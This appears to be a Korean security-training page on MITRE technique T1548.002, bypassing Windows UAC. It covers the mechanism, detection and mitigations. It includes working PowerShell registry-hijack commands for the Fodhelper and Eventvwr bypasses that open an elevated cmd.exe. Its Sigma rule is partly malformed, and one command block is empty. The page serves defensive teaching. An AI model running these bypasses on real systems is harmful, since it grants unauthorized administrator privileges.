# T1548.002 — Bypass User Account Control

## 개요

**TA0004 / T1548.002**  
Windows UAC(User Account Control)를 우회하여 관리자 권한을 획득하는 기법입니다. Fodhelper, Eventvwr 등 자동 권한 상승이 허용된 프로세스의 레지스트리 하이재킹을 통해 UAC 프롬프트 없이 관리자 권한으로 코드를 실행합니다.

---

## 동작 방식

1. 자동 권한 상승(Auto-Elevation)이 허용된 Windows 내장 바이너리 식별
2. 해당 바이너리가 실행 시 참조하는 레지스트리 키(HKCU)를 공격자가 제어하는 페이로드로 덮어쓰기
3. 바이너리 실행 시 높은 무결성(High Integrity) 컨텍스트에서 공격자의 페이로드 실행
4. UAC 프롬프트 없이 관리자 권한 획득

**주요 UAC 우회 기법:**
- Fodhelper (`ms-settings` 레지스트리 하이재킹)
- Eventvwr (`mscfile` 레지스트리 하이재킹)
- DiskCleanup (`windir` 환경변수 하이재킹)
- CMSTP

## 주요 커맨드 / 실습

### Fodhelper UAC Bypass
```powershell
# HKCU\Software\Classes\ms-settings 레지스트리 하이재킹
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force

# fodhelper.exe 실행 (자동으로 높은 무결성 레벨로 cmd.exe 실행)
Start-Process "C:\Windows\System32\fodhelper.exe"

# 사용 후 레지스트리 정리
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

### Eventvwr UAC Bypass
```powershell
# HKCU\Software\Classes\mscfile 레지스트리 하이재킹
New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force

# eventvwr.exe 실행
Start-Process "C:\Windows\System32\eventvwr.exe"
```

### 무결성 레벨 확인
```cmd

# High Integrity 확인 후 UAC 우회 성공 여부 판단
```

## 탐지 방법

### Sigma Rule
```yaml

id: 6d3e9e4d-8c4a-45e0-9a90-2a87c3507b42
status: stable

logsource:
    product: windows
    category: registry_set

    selection:
        TargetObject|contains:
            - '\Software\Classes\ms-settings\Shell\Open\command'
            - '\Software\Classes\mscfile\Shell\Open\command'
            - '\Software\Classes\exefile\Shell\Open\command'
    condition: selection
falsepositives:
    - Legitimate software installations (very rare for these paths)
level: high

```

## 대응 방안

1. UAC를 최대 설정으로 변경 ("항상 알림" 모드)
2. 일반 업무는 표준 사용자 계정으로 수행 (관리자 계정 일상 사용 금지)
3. `HKCU\Software\Classes` 레지스트리 변경 모니터링
4. Sysmon EventID 13 (레지스트리 값 설정) 로깅
5. 알려진 UAC 우회 도구 탐지 규칙 적용 (UACME 기반 탐지)
6. Windows Defender Credential Guard 활성화
